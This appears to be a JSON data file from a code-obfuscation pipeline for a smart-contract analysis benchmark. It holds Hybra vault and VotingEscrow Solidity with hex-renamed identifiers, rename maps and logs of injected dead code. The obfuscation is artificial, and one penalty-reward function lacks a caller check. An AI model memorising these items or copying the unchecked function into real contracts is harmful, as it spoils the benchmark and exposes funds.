Returns actual HYBR amount, not voting power\n     */\n    function _0x66e7d5() public view returns (uint256) {\n        if (_0x40e05b == 0) {\n            return 0;\n        }\n        // Get actual locked HYBR amount, not voting power\n        IVotingEscrow.LockedBalance memory _0x8e37c9 = IVotingEscrow(_0x38d618)._0x8e37c9(_0x40e05b);\n        return uint256(int256(_0x8e37c9._0x2aac73));\n    }\n\n    /**\n     * @notice Add transfer lock for new deposits\n     */\n    function _0xf9bcbd(address _0xaab307, uint256 _0x2aac73) internal {\n        uint256 _0xc0d332 = block.timestamp + _0xa5760b;\n        _0x9e4791[_0xaab307].push(UserLock({\n            _0x2aac73: _0x2aac73,\n            _0xc0d332: _0xc0d332\n        }));\n        _0x417eeb[_0xaab307] += _0x2aac73;\n    }\n\n    /**\n     * @notice Preview available balance (total - currently locked)\n     * @param user The user address to check\n     * @return available The current available balance for transfer\n     */\n    function _0x569dae(address _0xaab307) external view returns (uint256 _0x57be51) {\n        uint256 _0xbbd1ad = _0xa264cc(_0xaab307);\n        uint256 _0x3735df = 0;\n\n        UserLock[] storage _0xce3112 = _0x9e4791[_0xaab307];\n        for (uint256 i = 0; i < _0xce3112.length; i++) {\n            if (_0xce3112[i]._0xc0d332 > block.timestamp) {\n                _0x3735df += _0xce3112[i]._0x2aac73;\n            }\n        }\n\n        return _0xbbd1ad > _0x3735df ? _0xbbd1ad - _0x3735df : 0;\n    }\n    /**\n     * @notice Clean expired locks and update locked balance\n     * @param user The user address to clean locks for\n     * @return freed The amount of tokens freed from expired locks\n     */\n    function _0xdb6282(address _0xaab307) internal returns (uint256 _0xb98b92) {\n        UserLock[] storage _0xce3112 = _0x9e4791[_0xaab307];\n        uint256 _0x95f8fc = _0xce3112.length;\n        if (_0x95f8fc == 0) return 0;\n\n        uint256 _0x29e556 = 0;\n        unchecked {\n            for (uint256 i = 0; i < _0x95f8fc; i++) {\n                UserLock memory L = _0xce3112[i];\n                if (L._0xc0d332 <= block.timestamp) {\n                    _0xb98b92 += L._0x2aac73;\n                } else {\n                    if (_0x29e556 != i) _0xce3112[_0x29e556] = L;\n                    _0x29e556++;\n                }\n            }\n            if (_0xb98b92 > 0) {\n                _0x417eeb[_0xaab307] -= _0xb98b92;\n            }\n            while (_0xce3112.length > _0x29e556) {\n                _0xce3112.pop();\n            }\n        }\n    }\n\n    /**\n     * @notice Override transfer to implement lock mechanism\n     */\n    function _0x12f906(\n        address from,\n        address _0xaa7c26,\n        uint256 _0x2aac73\n    ) internal override {\n        super._0x12f906(from, _0xaa7c26, _0x2aac73);\n\n        if (from != address(0) && _0xaa7c26 != address(0)) { // Not mint or burn\n            uint256 _0xbbd1ad = _0xa264cc(from);\n\n            // Step 1: Check current available balance using cached lockedBalance\n            uint256 _0x10af94 = _0xbbd1ad > _0x417eeb[from] ? _0xbbd1ad - _0x417eeb[from] : 0;\n\n            // Step 2: If current available >= amount, pass directly\n            if (_0x10af94 >= _0x2aac73) {\n                return;\n            }\n\n            // Step 3: Not enough, clean expired locks and recalculate\n            _0xdb6282(from);\n            uint256 _0x6768c1 = _0xbbd1ad > _0x417eeb[from] ? _0xbbd1ad - _0x417eeb[from] : 0;\n\n            // Step 4: Check final available balance\n            require(_0x6768c1 >= _0x2aac73, \"Tokens locked\");\n        }\n    }\n\n    /**\n     * @notice Claim all rewards from voting and rebase\n     */\n    function _0xef97f2() external _0x9d31b5 {\n        require(_0x7463c1 != address(0), \"Voter not set\");\n        require(_0x5b5eb0 != address(0), \"Distributor not set\");\n\n        // Claim rebase rewards from RewardsDistributor\n        uint256  _0xed6677 = IRewardsDistributor(_0x5b5eb0)._0xf22ca9(_0x40e05b);\n        _0x21f622 += _0xed6677;\n        // Claim bribes from voted pools\n        address[] memory _0xf13b45 = IVoter(_0x7463c1)._0x73ec57(_0x40e05b);\n\n        for (uint256 i = 0; i < _0xf13b45.length; i++) {\n            if (_0xf13b45[i] != address(0)) {\n                address _0xecfada = IGaugeManager(_0x0d9c85)._0x1f4bcb(_0xf13b45[i]);\n\n                if (_0xecfada != address(0)) {\n                    // Prepare arrays for single bribe claim\n                    address[] memory _0xd13a97 = new address[](1);\n                    address[][] memory _0x8c3a19 = new address[][](1);\n\n                    // Claim internal bribe (trading fees)\n                    address _0xae5ffc = IGaugeManager(_0x0d9c85)._0x2e6d37(_0xecfada);\n                    if (_0xae5ffc != address(0)) {\n                        uint256 _0x53ff1c = IBribe(_0xae5ffc)._0x5f40af();\n                        if (_0x53ff1c > 0) {\n                            address[] memory _0xf39b5f = new address[](_0x53ff1c);\n                            for (uint256 j = 0; j < _0x53ff1c; j++) {\n                                _0xf39b5f[j] = IBribe(_0xae5ffc)._0xf39b5f(j);\n                            }\n                            _0xd13a97[0] = _0xae5ffc;\n                            _0x8c3a19[0] = _0xf39b5f;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x0d9c85)._0x9aa039(_0xd13a97, _0x8c3a19, _0x40e05b);\n                        }\n                    }\n\n                    // Claim external bribe\n                    address _0xa9023d = IGaugeManager(_0x0d9c85)._0x112b67(_0xecfada);\n                    if (_0xa9023d != address(0)) {\n                        uint256 _0x53ff1c = IBribe(_0xa9023d)._0x5f40af();\n                        if (_0x53ff1c > 0) {\n                            address[] memory _0xf39b5f = new address[](_0x53ff1c);\n                            for (uint256 j = 0; j < _0x53ff1c; j++) {\n                                _0xf39b5f[j] = IBribe(_0xa9023d)._0xf39b5f(j);\n                            }\n                            _0xd13a97[0] = _0xa9023d;\n                            _0x8c3a19[0] = _0xf39b5f;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x0d9c85)._0x9aa039(_0xd13a97, _0x8c3a19, _0x40e05b);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @notice Execute swap through the configured swapper module\n     * @param _params Swap parameters for the swapper module\n     */\n    function _0x8a7d9b(ISwapper.SwapParams calldata _0x830017) external _0x1b2a23 _0x9d31b5 {\n        require(address(_0x012212) != address(0), \"Swapper not set\");\n\n        // Get token balance before swap\n        uint256 _0x94e890 = IERC20(_0x830017._0xd69d62)._0xa264cc(address(this));\n        require(_0x94e890 >= _0x830017._0xca3467, \"Insufficient token balance\");\n\n        // Approve swapper to spend tokens\n        IERC20(_0x830017._0xd69d62)._0x8403ec(address(_0x012212), _0x830017._0xca3467);\n\n        // Execute swap through swapper module\n        uint256 _0xbd21de = _0x012212._0xc482b0(_0x830017);\n\n        // Reset approval for safety\n        IERC20(_0x830017._0xd69d62)._0x8403ec(address(_0x012212), 0);\n\n        // HYBR is now in this contract, ready for compounding\n        _0x790f45 += _0xbd21de;\n    }\n\n    /**\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\n     */\n    function _0x9bcd91() external _0x9d31b5 {\n\n        // Get current HYBR balance\n        uint256 _0x3b4f30 = IERC20(HYBR)._0xa264cc(address(this));\n\n        if (_0x3b4f30 > 0) {\n            // Lock all HYBR to existing veNFT\n            IERC20(HYBR)._0x8403ec(_0x38d618, _0x3b4f30);\n            IVotingEscrow(_0x38d618)._0x43936e(_0x40e05b, _0x3b4f30);\n\n            // Extend lock to maximum duration\n            _0x1180be();\n\n            _0x81fdca = block.timestamp;\n\n            emit Compound(_0x3b4f30, _0x66e7d5());\n        }\n    }\n\n    /**\n     * @notice Vote for gauges using the veNFT\n     * @param _poolVote Array of pools to vote for\n     * @param _weights Array of weights for each pool\n     */\n    function _0xee8af8(address[] calldata _0xfd33a4, uint256[] calldata _0x1ed05e) external {\n        require(msg.sender == _0x11e782() || msg.sender == _0xb12fd0, \"Not authorized\");\n        require(_0x7463c1 != address(0), \"Voter not set\");\n\n        IVoter(_0x7463c1)._0xee8af8(_0x40e05b, _0xfd33a4, _0x1ed05e);\n        if (true) { _0x612001 = HybraTimeLibrary._0x09429a(block.timestamp); }\n\n    }\n\n    /**\n     * @notice Reset votes\n     */\n    function _0x450e1f() external {\n        require(msg.sender == _0x11e782() || msg.sender == _0xb12fd0, \"Not authorized\");\n        require(_0x7463c1 != address(0), \"Voter not set\");\n\n        IVoter(_0x7463c1)._0x450e1f(_0x40e05b);\n    }\n\n    /**\n     * @notice Receive penalty rewards from rHYBR conversions\n     */\n    function _0x6f69c3(uint256 _0x2aac73) external {\n\n        // Auto-compound penalty rewards to existing veNFT\n        if (_0x2aac73 > 0) {\n            IERC20(HYBR)._0x823e89(_0x38d618, _0x2aac73);\n\n            if(_0x40e05b == 0){\n                _0x8029d8(_0x2aac73);\n            } else{\n                IVotingEscrow(_0x38d618)._0x43936e(_0x40e05b, _0x2aac73);\n\n                // Extend lock to maximum duration\n                _0x1180be();\n            }\n        }\n        _0x3a5dd1 += _0x2aac73;\n        emit PenaltyRewardReceived(_0x2aac73);\n    }\n\n    /**\n     * @notice Set the voter contract\n     */\n    function _0x078615(address _0xbe6d4e) external _0x9155b6 {\n        require(_0xbe6d4e != address(0), \"Invalid voter\");\n        _0x7463c1 = _0xbe6d4e;\n        emit VoterSet(_0xbe6d4e);\n    }\n\n    /**\n     * @notice Update transfer lock period\n     */\n    function _0xb49f0d(uint256 _0x49a465) external _0x9155b6 {\n        require(_0x49a465 >= MIN_LOCK_PERIOD && _0x49a465 <= MAX_LOCK_PERIOD, \"Invalid period\");\n        uint256 _0xe6530c = _0xa5760b;\n        if (1 == 1) { _0xa5760b = _0x49a465; }\n        emit TransferLockPeriodUpdated(_0xe6530c, _0x49a465);\n    }\n\n    /**\n     * @notice Set withdraw fee (in basis points)\n     * @param _fee Fee amount (10-30 basis points)\n     */\n    function _0xe16cb5(uint256 _0x977676) external _0x9155b6 {\n        require(_0x977676 >= MIN_WITHDRAW_FEE && _0x977676 <= MAX_WITHDRAW_FEE, \"Invalid fee\");\n        _0x7c4d71 = _0x977676;\n    }\n\n    function _0x16291c(uint256 _0xc52ee1) external _0x9155b6 {\n        _0x7b1285 = _0xc52ee1;\n    }\n\n    function _0xa5dc3c(uint256 _0xc52ee1) external _0x9155b6 {\n        if (true) { _0xeb5b99 = _0xc52ee1; }\n    }\n\n    /**\n     * @notice Set the swapper module\n     * @param _swapper Address of the swapper module\n     */\n    function _0x6653fc(address _0x66e6b7) external _0x9155b6 {\n        require(_0x66e6b7 != address(0), \"Invalid swapper\");\n        address _0x2a0b0b = address(_0x012212);\n        _0x012212 = ISwapper(_0x66e6b7);\n        emit SwapperUpdated(_0x2a0b0b, _0x66e6b7);\n    }\n\n    /**\n     * @notice Set the team address\n     */\n    function _0xd52ccc(address _0x24e627) external _0x9155b6 {\n        require(_0x24e627 != address(0), \"Invalid team\");\n        Team = _0x24e627;\n    }\n\n    /**\n     * @notice Emergency unlock for a user (owner only)\n     */\n    function _0x486e7c(address _0xaab307) external _0x9d31b5 {\n        delete _0x9e4791[_0xaab307];\n        _0x417eeb[_0xaab307] = 0;\n        emit EmergencyUnlock(_0xaab307);\n    }\n\n    /**\n     * @notice Get user's locks info\n     */\n    function _0x6c5e3c(address _0xaab307) external view returns (UserLock[] memory) {\n        return _0x9e4791[_0xaab307];\n    }\n\n    /**\n     * @notice Set operator address\n     */\n    function _0x622b74(address _0x7ffe9c) external _0x9155b6 {\n        require(_0x7ffe9c != address(0), \"Invalid operator\");\n        address _0x034675 = _0xb12fd0;\n        _0xb12fd0 = _0x7ffe9c;\n        emit OperatorUpdated(_0x034675, _0x7ffe9c);\n    }\n\n    /**\n     * @notice Get veNFT lock end time\n     */\n    function _0xa519a4() external view returns (uint256) {\n        if (_0x40e05b == 0) {\n            return 0;\n        }\n        IVotingEscrow.LockedBalance memory _0x8e37c9 = IVotingEscrow(_0x38d618)._0x8e37c9(_0x40e05b);\n        return uint256(_0x8e37c9._0x345e3f);\n    }\n\n    /**\n     * @notice Internal helper to safely extend lock to maximum duration\n     * @dev Calculates exact duration needed to reach max allowed unlock time\n     */\n    function _0x1180be() internal {\n        if (_0x40e05b == 0) return;\n\n        IVotingEscrow.LockedBalance memory _0x8e37c9 = IVotingEscrow(_0x38d618)._0x8e37c9(_0x40e05b);\n        if (_0x8e37c9._0x3ceb3a || _0x8e37c9._0x345e3f <= block.timestamp) return;\n\n        uint256 _0xb675c6 = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\n\n        // Only extend if difference is more than 2 hours\n        if (_0xb675c6 > _0x8e37c9._0x345e3f + 2 hours) {\n            try IVotingEscrow(_0x38d618)._0x32abd1(_0x40e05b, HybraTimeLibrary.MAX_LOCK_DURATION) {\n                // Extension successful\n            } catch {\n                // Extension failed, continue without error\n                // This can happen if already at max possible time or other constraints\n            }\n        }\n    }\n\n}",
      "rename_map": {
        "setTailNotWithdrawTime": "_0xa5dc3c",
        "setHeadNotWithdrawTime": "_0x16291c",
        "head_not_withdraw_time": "_0x7b1285",
        "tail_not_withdraw_time": "_0xeb5b99",
        "setRewardsDistributor": "_0x64dbb8",
        "setTransferLockPeriod": "_0xb49f0d",
        "_beforeTokenTransfer": "_0x12f906",
        "receivePenaltyReward": "_0x6f69c3",
        "increase_unlock_time": "_0x32abd1",
        "_rewardsDistributor": "_0x424908",
        "rewardsDistributor": "_0x5b5eb0",
        "transferLockPeriod": "_0xa5760b",
        "rewardsListLength": "_0x5f40af",
        "safeTransferFrom": "_0x4c8d99",
        "_initializeVeNFT": "_0x8029d8",
        "_extendLockToMax": "_0x1180be",
        "_addTransferLock": "_0xf9bcbd",
        "lastCompoundTime": "_0x81fdca",
        "currentAvailable": "_0x10af94",
        "previewAvailable": "_0x569dae",
        "emergencyUnlock": "_0x486e7c",
        "create_lock_for": "_0xfb395f",
        "calculateShares": "_0x8d53b7",
        "external_bribes": "_0x112b67",
        "internal_bribes": "_0x2e6d37",
        "setGaugeManager": "_0x1f51d5",
        "remainingAmount": "_0xb4512f",
        "calculateAssets": "_0xf98f04",
        "finalAvailable": "_0x6768c1",
        "getLockEndTime": "_0xa519a4",
        "sharesReceived": "_0x612a4d",
        "setWithdrawFee": "_0xe16cb5",
        "lastRebaseTime": "_0xcd0763",
        "newTotalLocked": "_0x0e3563",
        "initialAmount": "_0x62d814",
        "lockedBalance": "_0x417eeb",
        "internalBribe": "_0xae5ffc",
        "currentLocked": "_0x3735df",
        "_cleanExpired": "_0xdb6282",
        "_gaugeManager": "_0xb23916",
        "_votingEscrow": "_0x076938",
        "lastVoteEpoch": "_0x612001",
        "maxUnlockTime": "_0xb675c6",
        "externalBribe": "_0xa9023d",
        "transferFrom": "_0xfb54a8",
        "onlyOperator": "_0x9d31b5",
        "nonReentrant": "_0x1b2a23",
        "rebaseAmount": "_0xed6677",
        "totalBalance": "_0xbbd1ad",
        "claimRewards": "_0xef97f2",
        "_totalAssets": "_0xc1aa42",
        "getUserLocks": "_0x6c5e3c",
        "tokenBalance": "_0x94e890",
        "hybrReceived": "_0xbd21de",
        "votingEscrow": "_0x38d618",
        "gaugeManager": "_0x0d9c85",
        "_totalSupply": "_0x975e7c",
        "deposit_for": "_0x43936e",
        "hybrBalance": "_0x3b4f30",
        "userTokenId": "_0xe3276a",
        "newTokenIds": "_0xf229c5",
        "safeApprove": "_0x8403ec",
        "executeSwap": "_0x8a7d9b",
        "isPermanent": "_0x3ceb3a",
        "votingYield": "_0x790f45",
        "withdrawFee": "_0x7c4d71",
        "totalSupply": "_0xaad6fc",
        "oldOperator": "_0x034675",
        "claimBribes": "_0x9aa039",
        "bribeTokens": "_0xf39b5f",
        "newOperator": "_0x7c1541",
        "totalAssets": "_0x66e7d5",
        "setOperator": "_0x622b74",
        "oldSwapper": "_0x2a0b0b",
        "userAmount": "_0xc56f9d",
        "swapToHYBR": "_0xc482b0",
        "votedPools": "_0xf13b45",
        "unlockTime": "_0xc0d332",
        "hybrAmount": "_0x0fbfc9",
        "newSwapper": "_0x558b6b",
        "setSwapper": "_0x6653fc",
        "multiSplit": "_0xa93755",
        "epochStart": "_0x09429a",
        "feeTokenId": "_0x6ac8c2",
        "tokenCount": "_0x53ff1c",
        "epochNext": "_0xfde44d",
        "onlyOwner": "_0x9155b6",
        "balanceOf": "_0xa264cc",
        "oldPeriod": "_0xe6530c",
        "available": "_0x57be51",
        "userLocks": "_0x9e4791",
        "newPeriod": "_0x38e398",
        "_poolVote": "_0xfd33a4",
        "veTokenId": "_0x40e05b",
        "veBalance": "_0x6e705e",
        "recipient": "_0x6f2965",
        "feeAmount": "_0x15b3f6",
        "_operator": "_0x7ffe9c",
        "setVoter": "_0x078615",
        "lockTime": "_0x9eadb7",
        "_weights": "_0x1ed05e",
        "_swapper": "_0x66e6b7",
        "withdraw": "_0xef46ef",
        "amountIn": "_0xca3467",
        "operator": "_0xb12fd0",
        "compound": "_0x9bcd91",
        "poolVote": "_0x73ec57",
        "rewards": "_0x0d96ab",
        "enabled": "_0x33f5a1",
        "weights": "_0xc56a97",
        "approve": "_0x823e89",
        "amounts": "_0xa6e24a",
        "_period": "_0x49a465",
        "swapper": "_0x012212",
        "deposit": "_0x9edb97",
        "penalty": "_0x3a5dd1",
        "setTeam": "_0xd52ccc",
        "_params": "_0x830017",
        "tokenIn": "_0xd69d62",
        "rebase": "_0x21f622",
        "tokens": "_0x8c3a19",
        "_voter": "_0xbe6d4e",
        "locked": "_0x8e37c9",
        "shares": "_0x5f9576",
        "gauges": "_0x1f4bcb",
        "bribes": "_0xd13a97",
        "amount": "_0x2aac73",
        "claim": "_0xf22ca9",
        "_burn": "_0x391834",
        "freed": "_0xb98b92",
        "voted": "_0x1f4395",
        "_team": "_0x24e627",
        "epoch": "_0x89e8f3",
        "voter": "_0x7463c1",
        "gauge": "_0xecfada",
        "pools": "_0x528e0b",
        "_mint": "_0x8abc32",
        "_time": "_0xc52ee1",
        "reset": "_0x450e1f",
        "write": "_0x29e556",
        "owner": "_0x11e782",
        "_HYBR": "_0x6788c9",
        "_fee": "_0x977676",
        "user": "_0xaab307",
        "vote": "_0xee8af8",
        "fee": "_0xe09d75",
        "max": "_0xfb08cf",
        "arr": "_0xce3112",
        "end": "_0x345e3f",
        "len": "_0x95f8fc",
        "to": "_0xaa7c26"
      },
      "changes": [
        "Renamed 151 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_009",
      "transformed_id": "ss_l4_medium_sn_gs_009",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IERC721, IERC721Metadata} from \"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport {IERC20} from \"./interfaces/IERC20.sol\";\nimport \"./interfaces/IHybra.sol\";\nimport {IHybraVotes} from \"./interfaces/IHybraVotes.sol\";\nimport {IVeArtProxy} from \"./interfaces/IVeArtProxy.sol\";\nimport {IVotingEscrow} from \"./interfaces/IVotingEscrow.sol\";\nimport {IVoter} from \"./interfaces/IVoter.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport {VotingDelegationLib} from \"./libraries/VotingDelegationLib.sol\";\nimport {VotingBalanceLogic} from \"./libraries/VotingBalanceLogic.sol\";\n\n/// @title Voting Escrow\n/// @notice veNFT implementation that escrows ERC-20 tokens in the form of an ERC-721 NFT\n/// @notice Votes have a weight depending on time, so that users are committed to the future of (whatever they are voting for)\n/// @author Modified from Solidly (https://github.com/solidlyexchange/solidly/blob/master/contracts/ve.sol)\n/// @author Modified from Curve (https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy)\n/// @author Modified from Nouns DAO (https://github.com/withtally/my-nft-dao-project/blob/main/contracts/ERC721Checkpointable.sol)\n/// @dev Vote weight decays linearly over time. Lock time cannot be more than `MAXTIME` (2 years).\ncontract VotingEscrow is IERC721, IERC721Metadata, IHybraVotes {\n    enum DepositType {\n        DEPOSIT_FOR_TYPE,\n        CREATE_LOCK_TYPE,\n        INCREASE_LOCK_AMOUNT,\n        INCREASE_UNLOCK_TIME\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Deposit(\n        address indexed _0x378a1a,\n        uint _0xa09499,\n        uint value,\n        uint indexed _0x732bba,\n        DepositType _0xdf513e,\n        uint _0xcd5a26\n    );\n\n    event Merge(\n        address indexed _0x172b63,\n        uint256 indexed _0x926a34,\n        uint256 indexed _0x5d1a15,\n        uint256 _0x74bdb0,\n        uint256 _0xadabd1,\n        uint256 _0x961e9b,\n        uint256 _0xe26c1b,\n        uint256 _0xadd04e\n    );\n    event Split(\n        uint256 indexed _0x926a34,\n        uint256 indexed _0xe73705,\n        uint256 indexed _0x68d257,\n        address _0x172b63,\n        uint256 _0xea3733,\n        uint256 _0xc3f76b,\n        uint256 _0xe26c1b,\n        uint256 _0xadd04e\n    );\n\n    event MultiSplit(\n        uint256 indexed _0x926a34,\n        uint256[] _0x5182ca,\n        address _0x172b63,\n        uint256[] _0x1fd7f7,\n        uint256 _0xe26c1b,\n        uint256 _0xadd04e\n    );\n\n    event MetadataUpdate(uint256 _0x5df481);\n    event BatchMetadataUpdate(uint256 _0x9090a0, uint256 _0x8cdd89);\n\n    event Withdraw(address indexed _0x378a1a, uint _0xa09499, uint value, uint _0xcd5a26);\n    event LockPermanent(address indexed _0xcbad60, uint256 indexed _0x5df481, uint256 _0x4284c8, uint256 _0xadd04e);\n    event UnlockPermanent(address indexed _0xcbad60, uint256 indexed _0x5df481, uint256 _0x4284c8, uint256 _0xadd04e);\n    event Supply(uint _0x4801a9, uint _0x743a0f);\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    address public immutable _0x0ca0d4;\n    address public _0x3dd917;\n    address public _0x0b0202;\n    address public _0xa7958a;\n    // address public burnTokenAddress=0x000000000000000000000000000000000000dEaD;\n\n    uint public PRECISISON = 10000;\n\n    /// @dev Mapping of interface id to bool about whether or not it's supported\n    mapping(bytes4 => bool) internal _0x8f36bc;\n    mapping(uint => bool) internal _0x503743;\n\n    /// @dev ERC165 interface ID of ERC165\n    bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;\n\n    /// @dev ERC165 interface ID of ERC721\n    bytes4 internal constant ERC721_INTERFACE_ID = 0x80ac58cd;\n\n    /// @dev ERC165 interface ID of ERC721Metadata\n    bytes4 internal constant ERC721_METADATA_INTERFACE_ID = 0x5b5e139f;\n\n    /// @dev Current count of token\n    uint internal _0xa09499;\n\n    uint internal WEEK;\n\n    uint internal MAXTIME;\n    int128 internal _0x915f19;\n    IHybra public _0x25a9a4;\n\n    // Instance of the library's storage struct\n    VotingDelegationLib.Data private _0x14872c;\n\n    VotingBalanceLogic.Data private _0x38ef44;\n\n    /// @notice Contract constructor\n    /// @param token_addr `BLACK` token address\n    constructor(address _0x9da803, address _0x49c699) {\n        if (1 == 1) { _0x0ca0d4 = _0x9da803; }\n        if (gasleft() > 0) { _0x3dd917 = msg.sender; }\n        if (true) { _0x0b0202 = msg.sender; }\n        _0xa7958a = _0x49c699;\n        WEEK = HybraTimeLibrary.WEEK;\n        if (msg.sender != address(0) || msg.sender == address(0)) { MAXTIME = HybraTimeLibrary.MAX_LOCK_DURATION; }\n        _0x915f19 = int128(int256(HybraTimeLibrary.MAX_LOCK_DURATION));\n\n        _0x38ef44._0xef96cd[0]._0x61d546 = block.number;\n        _0x38ef44._0xef96cd[0]._0xcd5a26 = block.timestamp;\n\n        _0x8f36bc[ERC165_INTERFACE_ID] = true;\n        _0x8f36bc[ERC721_INTERFACE_ID] = true;\n        _0x8f36bc[ERC721_METADATA_INTERFACE_ID] = true;\n        _0x25a9a4 = IHybra(_0x0ca0d4);\n\n        // mint-ish\n        emit Transfer(address(0), address(this), _0xa09499);\n        // burn-ish\n        emit Transfer(address(this), address(0), _0xa09499);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                MODIFIERS\n    //////////////////////////////////////////////////////////////*/\n\n    uint8 internal constant _0x27fc60 = 1;\n    uint8 internal constant _0x3be27d = 2;\n    uint8 internal _0x9a5900 = 1;\n    modifier _0x42237d() {\n        require(_0x9a5900 == _0x27fc60);\n        _0x9a5900 = _0x3be27d;\n        _;\n        _0x9a5900 = _0x27fc60;\n    }\n\n    modifier _0x36539f(uint256 _0x5df481) {\n        require(!_0x503743[_0x5df481], \"PNFT\");\n        _;\n    }\n\n    modifier _0x94aa52(uint _0x926a34) {\n        require(_0x5adf69[msg.sender] || _0x5adf69[address(0)], \"!SPLIT\");\n        require(_0x45015f[_0x926a34] == 0 && !_0x91e191[_0x926a34], \"ATT\");\n        require(_0x090c25(msg.sender, _0x926a34), \"NAO\");\n        _;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                             METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string constant public _0x3776a6 = \"veHYBR\";\n    string constant public _0xa3208b = \"veHYBR\";\n    string constant public _0xa28113 = \"1.0.0\";\n    uint8 constant public _0x45282b = 18;\n\n    function _0xa53d9d(address _0x73f926) external {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        require(msg.sender == _0x0b0202);\n        _0x0b0202 = _0x73f926;\n    }\n\n    function _0xb34922(address _0xe80253) external {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        require(msg.sender == _0x0b0202);\n        _0xa7958a = _0xe80253;\n        emit BatchMetadataUpdate(0, type(uint256)._0x6ed9e9);\n    }\n\n    /// @param _tokenId The token ID to modify\n    /// @param _isPartner Whether this should be a partner veNFT\n    function _0x50b58e(uint _0x5df481, bool _0x38c90d) external {\n        require(msg.sender == _0x0b0202, \"NA\");\n        require(_0xa3b03d[_0x5df481] != address(0), \"DNE\");\n        _0x503743[_0x5df481] = _0x38c90d;\n    }\n\n    /// @dev Returns current token URI metadata\n    /// @param _tokenId Token ID to fetch URI for.\n    function _0x9f2cc5(uint _0x5df481) external view returns (string memory) {\n        require(_0xa3b03d[_0x5df481] != address(0), \"DNE\");\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n\n        return IVeArtProxy(_0xa7958a)._0x3b9531(_0x5df481,VotingBalanceLogic._0xf768b3(_0x5df481, block.timestamp, _0x38ef44),_0x0a02a8._0xcab435,uint(int256(_0x0a02a8._0x4284c8)));\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                      ERC721 BALANCE/OWNER STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Mapping from NFT ID to the address that owns it.\n    mapping(uint => address) internal _0xa3b03d;\n\n    /// @dev Mapping from owner address to count of his tokens.\n    mapping(address => uint) internal _0xd0dc6b;\n\n    /// @dev Returns the address of the owner of the NFT.\n    /// @param _tokenId The identifier for an NFT.\n    function _0x686137(uint _0x5df481) public view returns (address) {\n        return _0xa3b03d[_0x5df481];\n    }\n\n    function _0xe9033f(address _0xdc2230) public view returns (uint) {\n\n        return _0xd0dc6b[_0xdc2230];\n    }\n\n    /// @dev Returns the number of NFTs owned by `_owner`.\n    ///      Throws if `_owner` is the zero address. NFTs assigned p to the zero address are considered invalid.\n    /// @param _owner Address for whom to query the balance.\n    function _0xa5ebb8(address _0xcbad60) internal view returns (uint) {\n        return _0xd0dc6b[_0xcbad60];\n    }\n\n    /// @dev Returns the number of NFTs owned by `_owner`.\n    ///      Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n    /// @param _owner Address for whom to query the balance.\n    function _0x456354(address _0xcbad60) external view returns (uint) {\n        return _0xa5ebb8(_0xcbad60);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                         ERC721 APPROVAL STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Mapping from NFT ID to approved address.\n    mapping(uint => address) internal _0x1d4965;\n\n    /// @dev Mapping from owner address to mapping of operator addresses.\n    mapping(address => mapping(address => bool)) internal _0x8e8e9f;\n\n    mapping(uint => uint) public _0x5bc75c;\n\n    /// @dev Get the approved address for a single NFT.\n    /// @param _tokenId ID of the NFT to query the approval of.\n    function _0x52daae(uint _0x5df481) external view returns (address) {\n        return _0x1d4965[_0x5df481];\n    }\n\n    /// @dev Checks if `_operator` is an approved operator for `_owner`.\n    /// @param _owner The address that owns the NFTs.\n    /// @param _operator The address that acts on behalf of the owner.\n    function _0x06b160(address _0xcbad60, address _0xd22674) external view returns (bool) {\n        return (_0x8e8e9f[_0xcbad60])[_0xd22674];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC721 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n    ///      Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n    ///      Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n    ///      Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    /// @param _approved Address to be approved for the given NFT ID.\n    /// @param _tokenId ID of the token to be approved.\n    function _0xff84e0(address _0xd524e5, uint _0x5df481) public {\n        address _0xdc2230 = _0xa3b03d[_0x5df481];\n        // Throws if `_tokenId` is not a valid NFT\n        require(_0xdc2230 != address(0), \"ZA\");\n        // Throws if `_approved` is the current owner\n        require(_0xd524e5 != _0xdc2230, \"IA\");\n        // Check requirements\n        bool _0x44c6ee = (_0xa3b03d[_0x5df481] == msg.sender);\n        bool _0xff2727 = (_0x8e8e9f[_0xdc2230])[msg.sender];\n        require(_0x44c6ee || _0xff2727, \"NAO\");\n        // Set the approval\n        